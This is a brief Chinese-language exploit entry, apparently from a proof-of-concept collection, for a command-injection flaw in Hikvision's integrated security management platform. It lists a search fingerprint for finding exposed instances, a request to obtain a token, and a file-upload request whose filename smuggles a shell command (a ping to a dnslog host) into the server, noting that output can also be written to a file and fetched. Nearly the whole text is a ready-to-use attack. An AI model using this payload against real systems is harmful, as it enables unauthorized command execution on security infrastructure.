# 海康威视综合安防管理平台register命令执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="综合安防管理平台"`
- **请求**：`GET /iac/iasService/v1/register HTTP/1.1`

**请求体 / payload**
```
1.获取token
Host:
2.命令注入
POST /svm/api/v1/productFile?type=product\&ip=127.0.0.1\&agentNo=1 HTTP/1.1
Host:
Token: 获取的token
Content-Type: multipart/form-data;boundary =---------------------------123
-----------------------------123
Content-Disposition: form-data; name="file"; filename="`ping xxx.dnslog.cn`.zip"
Content-Type: application/zip
123
-----------------------------123--
也可以写入文件 ，访问获取执行结果
```